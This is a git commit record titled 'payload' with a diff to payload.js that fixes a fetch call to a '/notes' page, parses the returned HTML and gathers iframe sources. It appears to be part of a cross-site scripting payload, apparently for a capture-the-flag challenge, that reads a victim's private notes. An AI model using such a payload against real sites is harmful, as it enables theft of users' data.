afd02a39f5b86cb36134fbff5d60fc15fe020abc
Axl <bryannicholas7@gmail.com>
2025-06-20 22:37:26 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,4 +1,4 @@
-fetch('/notes'),{mode: 'no-cors'}.then(r=>r.text()).then(d=>{
+fetch('/notes', {mode: 'no-cors'}).then(r=>r.text()).then(d=>{
   let doc = (new DOMParser()).parseFromString(d, 'text/html');
   let iframes = doc.querySelectorAll('iframe');
   let sources = Array.from(iframes).map(iframe => iframe.getAttribute('src')).join(',');
